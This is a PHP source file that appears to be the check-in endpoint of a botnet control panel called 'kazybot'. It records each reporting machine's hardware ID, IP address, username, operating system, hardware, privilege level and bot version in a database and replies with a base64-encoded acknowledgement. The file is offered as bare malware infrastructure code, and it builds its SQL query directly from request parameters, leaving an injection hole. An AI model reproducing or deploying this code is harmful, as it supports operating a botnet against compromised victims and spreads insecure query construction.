<?php
require_once("settings.php");
$query = "INSERT INTO kazybot (HWID, IP, ID, USER, OS, PROCESSOR, MEMORY, RIGHTS, VERSION, LAST) 
VALUES ('" . $_REQUEST['HWID'] ."', '" . getUserIP(). "', '". $_REQUEST['ID']. "', '". $_REQUEST['USER']. "', '". $_REQUEST['OS'] ."', '" . $_REQUEST['PROCESSOR'] . "', '" . $_REQUEST['MEMORY'] . "', '" . $_REQUEST['RIGHTS'] . "', '". $_REQUEST['VERSION']."', NOW()) 
ON DUPLICATE KEY UPDATE LAST = NOW(), RIGHTS = '" . $_REQUEST['RIGHTS'] . "'";
mysqli_query($sql, $query);
echo base64_encode("OK");

function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
?>